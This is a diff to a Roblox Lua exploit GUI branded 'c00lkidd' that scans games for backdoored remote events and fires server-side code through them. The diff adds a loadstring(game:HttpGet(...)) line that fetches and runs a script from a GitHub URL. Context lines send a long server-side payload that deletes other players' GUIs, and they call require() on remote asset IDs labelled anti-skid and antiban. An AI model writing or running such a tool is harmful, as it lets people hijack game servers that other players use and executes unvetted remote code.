@@ -1,10 +1,4 @@
-local function notify(title,duration)
-		game.StarterGui:SetCore("SendNotification",{
-			Title = "c00lkidd",
-			Text = title,
-			Duration = duration or 5
-		})
-end
+local notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovechubbyorangecat/script/refs/heads/main/notification.lua", true))()
 local Converted = {
 	["_Starlight"] = Instance.new("ScreenGui");
 	["_Frame"] = Instance.new("Frame");
@@ -1262,7 +1256,7 @@ for _,v in pairs(Converted) do
         v.Color = Color3.fromRGB(255, 0, 0)
     end
 end
-task.wait(0.2) -- we need to wait first
+task.wait(0.1) -- we need to wait first
 local PFC = "password1.txt"
 local FTS = "password2.txt"
 
@@ -1272,7 +1266,6 @@ local sidebar = Converted["_Sidebar"]
 local verifyBtn = Converted["_Btn"]
 local textBox = Converted["_TextBox1"]
 
--- Hide GUI
 verifyFrame.Visible = true
 framee.Visible = false
 sidebar.Visible = false
@@ -1293,12 +1286,14 @@ local function validateKey(key)
 	if key == PFC then
 		verifyBtn.Text = "Key valid"
 		saveKey(key)
+		notify.Info("c00lkidd","Key Valid!")
 		task.wait(1)
 		verifyFrame.Visible = false
 		framee.Visible = true
 		sidebar.Visible = true
 	else
 		verifyBtn.Text = "Invalid"
+		notify.Error("c00lkidd","Key Invalid")
 		task.wait(1)
 		verifyBtn.Text = "Verify"
 	end
@@ -2451,19 +2446,26 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		FinishedFound = true
 	
 		if not foundExploit then
-			print("c00lkidd: no backdoor found")
+			notify.Error("c00lkidd","No backdoor :(")
 		end
 	
 		print(string.format("c00lkidd : scan completed in %.3f seconds", scanTime))
 	end
          local function fireRemoteEvent(code)
+	    local suc, rs = pcall(function()
 		if remoteEvent then
 			remoteEvent:FireServer(code)
 		elseif remoteFunction and remoteFunction:InvokeServer('starlightTSS', code) then
 			remoteFunction:InvokeServer('starlightTSS', code)
 		    else
 			remoteFunction:InvokeServer(code)
-	         end
+		  end
+	         end)
+	      if suc then 
+			notify.Info("c00lkidd","Success to execute!")
+		else
+			notify.Error("c00lkidd","Failed to exexute")
+	       end
 	     end
 	script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
 		script.Parent.Framee.Visible = false
@@ -2611,11 +2613,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			script.Parent.Framee.Log.Visible = true
 			script.Parent.Framee.Log.Text = "[" .. tostring(remoteEvent or remoteFunction) .. "]" .. "\n[" .. ((remoteEvent and remoteEvent.Name) or (remoteFunction and remoteFunction.Name) or "Unknown") .. "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
-			game.StarterGui:SetCore("SendNotification",{
-			Title = "c00lkidd",
-			Text = "Backdoor: " .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
-			Duration = 4
-		})
+			notify.Info("Backdoor Found!","" .. scanTime .."s")
 	        fireRemoteEvent('local Players=game:GetService("Players")local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","sugma","ro xploit","secret service panel","kid","666","k1d","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","j01tar0","koma","gigxxx","hax0rz","g00l","enstrio","br1cked","hax"}local whitelist={["greguiscool"]=true,["raizarit"]=true}local function isSuspicious(str)if not str then return false end str=str:lower()for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end local function getOwningPlayer(i)local p=i while p and not p:IsA("PlayerGui")do p=p.Parent end if p and p:IsA("PlayerGui")then local character=p.Parent return Players:GetPlayerFromCharacter(character)or Players:FindFirstChild(character.Name)end return nil end local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local nameStr=i.Name local textStr=i:IsA("TextLabel")and i.Text or"" local pl=getOwningPlayer(i)if pl and whitelist[pl.Name]then return end if isSuspicious(nameStr)or isSuspicious(textStr)then local hint=Instance.new("Hint",workspace)hint.Text="[Skid] Deleted suspicious GUI: "..nameStr..(pl and" (user: "..pl.DisplayName..")"or" (Unknown)") task.delay(3,function()if hint and hint.Parent then hint:Destroy()end end) local f=i while f and not f:IsA("Frame")do f=f.Parent end if f then f:Destroy() else i:Destroy() end end end end for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end game.DescendantAdded:Connect(function(obj) pcall(deleteIfSuspicious,obj) end)task.spawn(function() while true do for _,obj in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,obj)end task.wait(5)end end)')
                 fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 		fireRemoteEvent('require(7458325257).antiban()')
